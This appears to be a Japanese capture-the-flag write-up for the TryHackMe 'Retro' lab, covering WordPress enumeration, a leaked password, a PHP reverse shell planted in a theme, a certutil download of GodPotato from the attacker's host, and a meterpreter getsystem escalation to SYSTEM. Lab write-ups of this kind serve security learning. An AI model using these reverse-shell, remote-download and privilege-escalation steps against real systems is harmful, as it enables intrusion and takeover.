# Retro CTF

https://tryhackme.com/room/retro

## Enumeration

```shell
TARGET=10.48.185.233
sudo bash -c "echo $TARGET   retro.thm >> /etc/hosts"
```

### ポートスキャン

```sh
sudo nmap -vv -Pn -p- --min-rate 10000 $TARGET

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128

nmap -vv -Pn -sV -p80,3389 --min-rate 10000 $TARGET
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
```

HTTP, Terminal

### ディレクトリ列挙

retroディレクトリを発見。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -u http://$TARGET -w ./dirlist.txt -t 64 -k
/Retro                (Status: 301) [Size: 150] [--> http://10.48.185.233/Retro/]
/retro                (Status: 301) [Size: 150]
```

## /retro

ブログが表示される。ソースを見たらWordPressということは分かった。

```sh
root@ip-10-48-124-237:~# wpscan --url http://retro.thm/retro/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://retro.thm/retro/ [10.48.185.233]
[+] Started: Fri Jan 16 01:14:35 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://retro.thm/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://retro.thm/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://retro.thm/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://retro.thm/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://retro.thm/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://retro.thm/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://retro.thm/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://retro.thm/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://retro.thm/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 16 01:14:50 2026
[+] Requests Done: 53
[+] Cached Requests: 5
[+] Data Sent: 13.127 KB
[+] Data Received: 175.855 KB
[+] Memory used: 206.695 MB
[+] Elapsed time: 00:00:14
```

90s-retroというテーマは気になったが、検索しても脆弱性は見つからなかった。

http://retro.thm/retro/index.php/comments/feed/ の下記が気になった。

```xml
<![CDATA[<p>Leaving myself a note here just in case I forget how to spell it: [REDACTED]</p>
```

これをパスワードとして、wp-login.php でwadeユーザーとしてログインできた。

404テーマをPHP Ivan Sincekに変更してトリガー。

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.185.233] 50155
SOCKET: Shell has connected! PID: 3568
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\retro>
```

Wadeのユーザーディレクトリに入りたいが、権限がない。

```sh
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 7443-948C

 Directory of C:\Users

12/08/2019  04:33 PM    <DIR>          .
12/08/2019  04:33 PM    <DIR>          ..
12/08/2019  11:10 PM    <DIR>          Administrator
09/12/2016  03:37 AM    <DIR>          Public
12/08/2019  04:33 PM    <DIR>          Wade
               0 File(s)              0 bytes
               5 Dir(s)  30,217,736,192 bytes free
```

## 権限昇格１

SeImpersonatePrivilege 権限がある。

```sh
C:\Users>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

GodPotato をダウンロード

```sh
C:\Users\Public\Downloads>certutil -URLcache -split -f http://192.168.129.39:8000/godpotato.exe C:\Users\Public\Downloads\godpotato.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

GodPotato による権限昇格は失敗。

```sh
C:\Users\Public\Downloads>.\godpotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140718415872000
[*] DispatchTable: 0x140718417848816
[*] UseProtseqFunction: 0x140718417379952
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\3a403303-4911-4818-84ee-f98dccc3c25b\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003802-0318-ffff-07e8-280846775612
[*] DCOM obj OXID: 0xa8af7029df8f0d75
[*] DCOM obj OID: 0xf9e0c633e2906d77
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
```

WordPressと同じ認証情報で、WadeとしてRDP接続できた。ユーザーフラグ入手。

しかし、Wadeはretroよりはるかに権限が少ない。

```sh
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

retro で meterpreter を取得し、getsystem を実行したらSystemシェルを取れた。

```sh
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > shell
Process 3480 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Public\Downloads>whoami
whoami
nt authority\system
```

```sh
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7443-948C

 Directory of C:\Users\Administrator\Desktop

12/08/2019  08:06 PM    <DIR>          .
12/08/2019  08:06 PM    <DIR>          ..
12/08/2019  08:08 PM                32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30,216,364,032 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
```

## 振り返り

- Hardにしてはかなり易しめ。Easyでもおかしくない程度。
- Potato や PrintSpoofer が失敗しても、meterpreter で getsystem を実行するだけで昇格成功したのは目から鱗。

## Tags

#tags:Windows #tags:WordPress
